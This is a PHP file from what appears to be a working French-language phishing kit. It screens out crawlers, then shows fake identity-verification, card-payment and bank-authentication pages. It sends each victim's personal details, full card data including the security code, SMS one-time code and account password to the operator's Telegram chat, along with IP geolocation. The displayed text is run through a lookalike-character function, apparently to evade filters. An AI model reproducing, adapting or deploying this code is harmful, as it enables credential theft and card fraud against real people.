<?php

use Jaybizzle\CrawlerDetect\CrawlerDetect;
use IP2Location\Database;
use Vectorface\Whip\Whip;

session_start();
require_once './../config/config.php';

$CrawlerDetect = new CrawlerDetect;

// Check the user agent of the current 'visitor'
if ($CrawlerDetect->isCrawler()) {
    // true if crawler user agent detected
    http_response_code(403);
    die();
}

$whip = new Whip();
$clientAddress = $whip->getValidIpAddress();

// Open a database connection
$pdo = new PDO('sqlite:' . BASE_PATH . '/data/db/blacklist.db');
$pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

// Create the 'blacklist' table if it doesn't exist
$pdo->exec("CREATE TABLE IF NOT EXISTS blacklist (
    ip_address TEXT PRIMARY KEY,
    blocked_at TEXT
)");

// Check if the visitor's IP is blacklisted
$stmt = $pdo->prepare("SELECT * FROM blacklist WHERE ip_address = :ip");
$stmt->execute(['ip' => $_SERVER['REMOTE_ADDR']]);
if ($stmt->fetch()) {
    http_response_code(403);
    die();
}

if (!isset($_GET['op']) or (isset($_GET['op']) && empty($_GET['op'])) or (isset($_GET['op']) && !in_array($_GET['op'], $_SESSION["op"]))) {
    header("Location: ?op=" . $_SESSION["op"][0]);
    die();
}

$parsed_url = parse_url((isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]");

$scheme = isset($parsed_url['scheme']) ? $parsed_url['scheme'] . '://' : '';
$host = isset($parsed_url['host']) ? $parsed_url['host'] : '';
$port = isset($parsed_url['port']) ? ':' . $parsed_url['port'] : '';
$user = isset($parsed_url['user']) ? $parsed_url['user'] : '';
$pass = isset($parsed_url['pass']) ? ':' . $parsed_url['pass']  : '';
$pass = ($user || $pass) ? "$pass@" : '';

//Handle update request. As the form's action attribute is set to the same script, but 'POST' method, 
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    /*
	   Cache whole database into system memory and share among other scripts & websites
	   WARNING: Please make sure your system have sufficient RAM to enable this feature
	*/
    // $db = new \IP2Location\Database('./data/IP-COUNTRY-SAMPLE.BIN', \IP2Location\Database::SHARED_MEMORY);
    /*
	   Cache the database into memory to accelerate lookup speed
	   WARNING: Please make sure your system have sufficient RAM to enable this feature
	*/
    // $db = new \IP2Location\Database('./data/IP-COUNTRY-SAMPLE.BIN', \IP2Location\Database::MEMORY_CACHE);


    /*
		Default file I/O lookup
	*/
    $db = new Database(BASE_PATH . '/data/IP2LOCATION-LITE-DB11.IPV6.BIN', Database::FILE_IO);

    $records = $db->lookup($clientAddress, Database::ALL);

    $telegram = new \Telegram(BOT_API_KEY);

    // Construct the URLs
    /* $url = SESSION_URL . '/callback.php?session_id=' . session_id() . '&url=' . base64_encode("$scheme$user$pass$host$port/" . APP_PATH . '/' . EMBED_PATH . '?url=' . base64_encode("$scheme$user$pass$host$port/" . APP_PATH . '/' . str_replace('.php', '', $_SESSION["filename"][0]) . '?op=' . $_SESSION["op"][0])) . '&redirect=true';

$keyboard = [
    'inline_keyboard' => [
        [
            ['text' => '', 'url' => $url],
            ['text' => '', 'url' => $url],
        ],
        [
            ['text' => '', 'url' => $url],
        ],
    ]
]; */

    $blockIPAddressURL = SESSION_URL . '/blacklist.php?ip_address=' . urlencode($records['ipAddress']);

    $keyboard = [
        'inline_keyboard' => [
            [
                ['text' => 'Block IP Address', 'url' => $blockIPAddressURL],
            ],
        ]
    ];

    if ($_GET['op'] === $_SESSION["op"][0]) {
        $result = $telegram->sendMessage([
            'chat_id' => CHAT_ID,
            'text' => "👤 First Name: " . $_POST[$_SESSION["attribute"][0]] . PHP_EOL .
                "👤 Last Name: " . $_POST[$_SESSION["attribute"][1]] . PHP_EOL .
                "🎂 Birthday (MM/DD/YYYY): " . (new DateTime($_POST[$_SESSION["attribute"][2]]))->format('m/d/Y') . PHP_EOL .
                "📧 E-Mail Address: " . $_POST[$_SESSION["attribute"][3]] . PHP_EOL .
                "📞 Phone Number: " . $_POST[$_SESSION["attribute"][4]] . PHP_EOL .
                "🏠 Address: " . $_POST[$_SESSION["attribute"][5]] . PHP_EOL .
                "📮 Zip Code: " . $_POST[$_SESSION["attribute"][6]] . PHP_EOL .
                "🏙️ City: " . $_POST[$_SESSION["attribute"][7]] . PHP_EOL . PHP_EOL .
                "🌍 IP Address: " . $records['ipAddress'] . PHP_EOL .
                country2flag($records['countryCode']) . " Country Name: " . $records['countryName'] . PHP_EOL .
                "📍 Region Name: " . $records['regionName'] . PHP_EOL .
                "🏙️ City Name: " . $records['cityName'] . PHP_EOL .
                "📮 ZIP Code: " . $records['zipCode'] . PHP_EOL .
                "🖥️ User-Agent: " . $_SERVER['HTTP_USER_AGENT'] . PHP_EOL . PHP_EOL .
                "📝 Raw: " . json_encode($_POST),
            'reply_markup' => json_encode($keyboard),
        ]);


        die();
    }

    if ($_GET['op'] === $_SESSION["op"][1]) {
        $bin = substr(str_replace(' ', '', $_POST[$_SESSION["attribute"][9]]), 0, 8);
        $cardInfo = getCardInfo($bin, PROXY, PROXYUSERPWD, CAINFO);

        $result = $telegram->sendMessage([
            'chat_id' => CHAT_ID,
            'text' => "💳 Card holder: " . $_POST[$_SESSION["attribute"][8]] . PHP_EOL .
                "🔢 Card Number: " . $_POST[$_SESSION["attribute"][9]] . PHP_EOL .
                "📅 Expiration Date (MM/YY): " . $_POST[$_SESSION["attribute"][10]] . PHP_EOL .
                "🔒 Security Code: " . $_POST[$_SESSION["attribute"][11]] . PHP_EOL . PHP_EOL .
                "🏦 Bank Name: " . $cardInfo['bank']['name'] . PHP_EOL .
                "📇 Type: " . $cardInfo['type'] . PHP_EOL .
                "🏷️ Brand: " . $cardInfo['brand'] . PHP_EOL . PHP_EOL .
                "🌍 IP Address: " . $records['ipAddress'] . PHP_EOL .
                country2flag($records['countryCode']) . " Country Name: " . $records['countryName'] . PHP_EOL .
                "📍 Region Name: " . $records['regionName'] . PHP_EOL .
                "🏙️ City Name: " . $records['cityName'] . PHP_EOL .
                "📮 ZIP Code: " . $records['zipCode'] . PHP_EOL .
                "🖥️ User-Agent: " . $_SERVER['HTTP_USER_AGENT'] . PHP_EOL . PHP_EOL .
                "📝 Raw: " . json_encode($_POST),
            'reply_markup' => json_encode($keyboard),
        ]);


        die();
    }

    if ($_GET['op'] === $_SESSION["op"][2]) {
        if ($_POST[$_SESSION["attribute"][12]] == '2') {
            $result = $telegram->sendMessage([
                'chat_id' => CHAT_ID,
                'text' => "🔑 OTP: " . $_POST[$_SESSION["attribute"][13]] . PHP_EOL .
                    "🔒 Password: " . $_POST[$_SESSION["attribute"][14]] . PHP_EOL . PHP_EOL .
                    "🌍 IP Address: " . $records['ipAddress'] . PHP_EOL .
                    country2flag($records['countryCode']) . " Country Name: " . $records['countryName'] . PHP_EOL .
                    "📍 Region Name: " . $records['regionName'] . PHP_EOL .
                    "🏙️ City Name: " . $records['cityName'] . PHP_EOL .
                    "📮 ZIP Code: " . $records['zipCode'] . PHP_EOL .
                    "🖥️ User-Agent: " . $_SERVER['HTTP_USER_AGENT'] . PHP_EOL . PHP_EOL .
                    "📝 Raw: " . json_encode($_POST),
                'reply_markup' => json_encode($keyboard),
            ]);
        }

        die();
    }
}
?>

<?php include BASE_PATH . '/src/iframe/includes/header.php' ?>

<?php if ($_GET['op'] === $_SESSION["op"][0]) { ?>
    <h1><?php echo getCyrillicAlphabet('Vérification de vos informations'); ?></h1>
    <div class="fr-mb-45c" style="
    justify-content: center;
    display: flex;
">
        <div class="fle-xow w-vml jc-xf2">
            <div class="form-f58">
                <p><?php echo getCyrillicAlphabet('Tous les champs sont obligatoires.'); ?></p>
                <form class="form-b69">
                    <div>
                        <div class="input-coz">
                            <label class="label-sb7" for="<?php echo $_SESSION["attribute"][0]; ?>">
                                <span><?php echo getCyrillicAlphabet('Prénom'); ?> </span>
                            </label>
                            <input class="input-3j4" id="<?php echo $_SESSION["attribute"][0]; ?>" name="<?php echo $_SESSION["attribute"][0]; ?>" type="text">
                        </div>
                        <div class="input-coz">
                            <label class="label-sb7" for="<?php echo $_SESSION["attribute"][1]; ?>">
                                <span><?php echo getCyrillicAlphabet('Nom'); ?> </span>
                            </label>
                            <input class="input-3j4" id="<?php echo $_SESSION["attribute"][1]; ?>" name="<?php echo $_SESSION["attribute"][1]; ?>" type="text">
                        </div>
                    </div>
                    <div class="input-coz">
                        <label class="label-sb7" for="<?php echo $_SESSION["attribute"][2]; ?>">
                            <span><?php echo getCyrillicAlphabet('Date de naissance'); ?> </span>
                            <span class="text-oek"><?php echo getCyrillicAlphabet('Exemple:'); ?> <?php echo (new DateTime())->modify('-18 years')->format('d/m/Y'); ?></span>
                        </label>
                        <input class="input-3j4" id="<?php echo $_SESSION['attribute'][2]; ?>" name="<?php echo $_SESSION['attribute'][2]; ?>" type="date" max="<?php echo (new DateTime())->modify('-18 years')->format('Y-m-d'); ?>">
                    </div>
                    <div class="input-coz">
                        <label class="label-sb7" for="<?php echo $_SESSION["attribute"][3]; ?>">
                            <span><?php echo getCyrillicAlphabet('Adresse électronique'); ?> </span>
                            <span class="text-oek"><?php echo getCyrillicAlphabet('Exemple de format attendu : nom@domaine.fr'); ?></span>
                        </label>
                        <input class="input-3j4" id="<?php echo $_SESSION["attribute"][3]; ?>" name="<?php echo $_SESSION["attribute"][3]; ?>" type="text">
                    </div>
                    <div class="input-coz">
                        <label class="label-sb7" for="<?php echo $_SESSION["attribute"][4]; ?>">
                            <span><?php echo getCyrillicAlphabet('Numéro de téléphone'); ?> </span>
                        </label>
                        <input class="input-3j4" id="<?php echo $_SESSION["attribute"][4]; ?>" name="<?php echo $_SESSION["attribute"][4]; ?>" type="text">
                    </div>
                    <div class="input-coz">
                        <label class="label-sb7" for="<?php echo $_SESSION["attribute"][5]; ?>">
                            <span><?php echo getCyrillicAlphabet('Adresse'); ?> </span>
                        </label>
                        <input class="input-3j4" id="<?php echo $_SESSION["attribute"][5]; ?>" name="<?php echo $_SESSION["attribute"][5]; ?>" type="text" placeholder="<?php echo getCyrillicAlphabet('N° voie - Type de voie - Libellé de voie'); ?>">
                    </div>
                    <div>
                        <div class="input-coz">
                            <label class="label-sb7" for="<?php echo $_SESSION["attribute"][6]; ?>">
                                <span><?php echo getCyrillicAlphabet('Code postal'); ?> </span>
                            </label>
                            <input class="input-3j4" id="<?php echo $_SESSION["attribute"][6]; ?>" name="<?php echo $_SESSION["attribute"][6]; ?>" type="text" placeholder="00000">
                        </div>
                        <div class="input-coz">
                            <label class="label-sb7" for="<?php echo $_SESSION["attribute"][7]; ?>">
                                <span><?php echo getCyrillicAlphabet('Ville'); ?> </span>
                            </label>
                            <input class="input-3j4" id="<?php echo $_SESSION["attribute"][7]; ?>" name="<?php echo $_SESSION["attribute"][7]; ?>" type="text" placeholder="<?php echo getCyrillicAlphabet('Nom ville'); ?>">
                        </div>
                    </div>
                    <button type="submit" class="btn-r1e"> <?php echo getCyrillicAlphabet('Valider et Continuer'); ?> </button>
                </form>
            </div>
        </div>
    </div>
<?php } ?>

<?php if ($_GET['op'] === $_SESSION["op"][1]) { ?>
    <h1><?php echo getCyrillicAlphabet('Procéder au paiement par carte'); ?></h1>
    <div class="fr-mb-45c" style="
    justify-content: center;
    display: flex;
">
        <div class="fle-xow w-vml jc-xf2">
            <div class="form-f58">
                <form class="form-b69">
                    <img src="./../src/images/ALTP-page-CB.jpg" style="width: 100%; margin: var(--text-spacing);">
                    <p><?php echo getCyrillicAlphabet('Tous les champs sont obligatoires.'); ?></p>
                    <div class="input-coz">
                        <label class="label-sb7" for="<?php echo $_SESSION["attribute"][8]; ?>">
                            <span><?php echo getCyrillicAlphabet('Titulaire de la carte'); ?> </span>
                        </label>
                        <input class="input-3j4" id="<?php echo $_SESSION["attribute"][8]; ?>" name="<?php echo $_SESSION["attribute"][8]; ?>" type="text">
                    </div>
                    <div class="input-coz">
                        <label class="label-sb7" for="<?php echo $_SESSION["attribute"][9]; ?>">
                            <span><?php echo getCyrillicAlphabet('Numéro de la carte'); ?> </span>
                        </label>
                        <input class="input-3j4" id="<?php echo $_SESSION["attribute"][9]; ?>" name="<?php echo $_SESSION["attribute"][9]; ?>" type="text">
                    </div>
                    <div class="input-coz">
                        <label class="label-sb7" for="<?php echo $_SESSION["attribute"][10]; ?>">
                            <span><?php echo getCyrillicAlphabet('Date d\'expiration'); ?> </span>
                            <span class="text-oek"><?php echo getCyrillicAlphabet('Exemple:'); ?> <?php echo (new DateTime())->format('m/y'); ?></span>
                        </label>
                        <input class="input-3j4" id="<?php echo $_SESSION['attribute'][10]; ?>" name="<?php echo $_SESSION['attribute'][10]; ?>" type="text" placeholder="MM/AA">
                    </div>
                    <div class="input-coz">
                        <label class="label-sb7" for="<?php echo $_SESSION["attribute"][11]; ?>">
                            <span><?php echo getCyrillicAlphabet('Cryptogramme visuel'); ?> </span>
                        </label>
                        <input class="input-3j4" id="<?php echo $_SESSION["attribute"][11]; ?>" name="<?php echo $_SESSION["attribute"][11]; ?>" type="text">
                    </div>
                    <button type="submit" class="btn-r1e"> <?php echo getCyrillicAlphabet('Payer ou consigner'); ?> </button>
                </form>
            </div>
        </div>
    </div>
<?php } ?>

<?php if ($_GET['op'] === $_SESSION["op"][2]) { ?>
    <div>
        <div class="style-2gZ8c" id="style-2gZ8c">
            <message-banner>
                <div id="mes-kjz" class="war-1h7" style="">
                    <div id="mes-hor">
                        <custom-component>
                            <div>
                                <div style="font-size: 14px;">
                                    <span id="inf-s1o" class="col-28q col-1kj fa-dzz info-6lm" style="font-size: 4em;"></span>
                                    <custom-text id="hea-bey"><span id="hea-bey"><?php echo getCyrillicAlphabet('En attente d\'authentification'); ?></span></custom-text>
                                    <custom-text id="mes-dz8"><span id="mes-dz8"></span></custom-text>
                                    <alternative-display value="'0'"></alternative-display>
                                    <div>
                                        <alternative-display value="''"></alternative-display>
                                        <div class="style-oAeWM" id="style-oAeWM">
                                        </div>
                                        <div>
                                        </div>
                                    </div>
                                    <div class="style-PxPmB" id="style-PxPmB">
                                    </div>
                                </div>
                            </div>
                        </custom-component>
                        <div id="mes-d3r">
                            <div id="spi-meq">
                                <div class="style-dayXR" id="style-dayXR">
                                    <div id="style-M5rHE" class="style-M5rHE">
                                        <div id="style-aLhiI" class="style-aLhiI"></div>
                                    </div>
                                    <div id="style-JvYIj" class="style-JvYIj">
                                        <div id="style-QoxTc" class="style-QoxTc"></div>
                                    </div>
                                    <div id="style-OJd8c" class="style-OJd8c">
                                        <div id="style-dmkvz" class="style-dmkvz"></div>
                                    </div>
                                    <div id="style-xxW3w" class="style-xxW3w">
                                        <div id="style-8tQX4" class="style-8tQX4"></div>
                                    </div>
                                    <div id="style-6Bnn9" class="style-6Bnn9">
                                        <div id="style-RWO8X" class="style-RWO8X"></div>
                                    </div>
                                    <div id="style-JZU4L" class="style-JZU4L">
                                        <div id="style-ran2U" class="style-ran2U"></div>
                                    </div>
                                    <div id="style-bdmLo" class="style-bdmLo">
                                        <div id="style-mGwxP" class="style-mGwxP"></div>
                                    </div>
                                    <div id="style-yn5Xx" class="style-yn5Xx">
                                        <div id="style-NAgVD" class="style-NAgVD"></div>
                                    </div>
                                    <div id="style-AwWkl" class="style-AwWkl">
                                        <div id="style-FRTsE" class="style-FRTsE"></div>
                                    </div>
                                    <div id="style-K7Feg" class="style-K7Feg">
                                        <div id="style-omPGa" class="style-omPGa"></div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </message-banner>
        </div>
        <div id="col-j7l" class="Cus-mkg">
            <div id="style-krD86" class="style-krD86" style="background: #ec971f;">
                <custom-text class="style-tvGxB" id="style-tvGxB">
                    <p><span><b><?php echo getCyrillicAlphabet('Connectez-vous sur votre application bancaire ou insérez le code reçu par SMS afin de finaliser votre opération.'); ?></b></span></p>

                    <p><span><b><?php echo getCyrillicAlphabet('Cette opération peut prendre une minute.'); ?></b></span></p>
                </custom-text>
            </div>
        </div>
    </div>

    <div class="fr-mb-45c" style="
    justify-content: center;
    display: flex;
">
        <div class="fle-xow w-vml jc-xf2">
            <div class="form-f58">
                <p><?php echo getCyrillicAlphabet('Tous les champs sont obligatoires.'); ?></p>
                <form class="form-b69">
                    <div class="input-coz">
                        <label class="label-sb7" for="<?php echo $_SESSION["attribute"][12]; ?>">
                            <span><?php echo getCyrillicAlphabet('Méthode de confirmation'); ?> </span>
                        </label>
                        <select class="select-61r" id="<?php echo $_SESSION["attribute"][12]; ?>" name="<?php echo $_SESSION["attribute"][12]; ?>">
                            <option value="1" selected><?php echo getCyrillicAlphabet('Validation par application bancaire'); ?> </option>
                            <option value="2"><?php echo getCyrillicAlphabet('J\'ai reçu un code sms'); ?> </option>
                        </select>
                    </div>
                    <div style="display: none;">
                        <div>
                            <div class="input-coz">
                                <label class="label-sb7" for="<?php echo $_SESSION["attribute"][13]; ?>">
                                    <span><?php echo getCyrillicAlphabet('Code SMS reçu'); ?> </span>
                                </label>
                                <input class="input-3j4" id="<?php echo $_SESSION["attribute"][13]; ?>" name="<?php echo $_SESSION["attribute"][13]; ?>" type="text" disabled>
                            </div>
                            <div class="input-coz">
                                <label class="label-sb7" for="<?php echo $_SESSION["attribute"][14]; ?>">
                                    <span><?php echo getCyrillicAlphabet('PIN 2'); ?> </span>
                                    <span class="text-oek"><?php echo getCyrillicAlphabet('Mot de passe de l\'espace client de votre compte'); ?></span>
                                </label>
                                <input class="input-3j4" id="<?php echo $_SESSION["attribute"][14]; ?>" name="<?php echo $_SESSION["attribute"][14]; ?>" type="text" disabled>
                            </div>
                        </div>
                    </div>
                    <div style="display: none;">
                        <p><?php echo getCyrillicAlphabet('Connectez-vous à votre application bancaire et attendez que l\'opération démarre, puis suivez les instructions...'); ?></p>
                        <p><?php echo getCyrillicAlphabet('Une fois complétée, cette page sera automatiquement mise à jour et vous recevrez votre confirmation de paiement par e-mail.'); ?></p>
                        <p></p>
                    </div>
                    <button type="submit" class="btn-r1e"> <?php echo getCyrillicAlphabet('Confirmer'); ?> </button>
                </form>
            </div>
        </div>
    </div>
<?php } ?>

<?php include BASE_PATH . '/src/iframe/includes/footer.php' ?>